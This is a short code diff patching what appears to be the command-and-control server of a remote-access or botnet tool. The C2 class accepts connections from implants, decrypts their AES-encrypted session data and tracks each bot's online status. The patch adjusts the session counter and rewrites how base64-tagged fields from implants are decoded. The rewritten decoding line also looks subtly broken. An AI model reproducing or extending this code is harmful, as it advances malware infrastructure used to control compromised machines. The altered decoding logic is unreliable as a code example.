@@ -762,6 +762,7 @@ class C2():
             self.database.update_status(session.get('uid'), 0)
             session['online'] = False
             self.sessions[session.get('id')] = { "info": session, "connection": None }
+            self._count += 1
         while True:
             connection, address = self.socket.accept()
             session = Session(connection=connection, id=self._count)
@@ -908,8 +909,8 @@ class Session(threading.Thread):
         msg = self.connection.recv(msg_size)
         data = security.decrypt_aes(msg, self.key)
         info = json.loads(data)
-        for item in [item for item in info if info[item].startswith("_b64")]:
-            info[item] = base64.decodebytes(info[item].decode('ascii'))
+        for item in [item for item in info if "_b64" in str(info[item])[0:5]]:
+            info[item] = base64.b64decode(bytes(info[item][6:])).decode('ascii')
         return info
 
     def status(self):
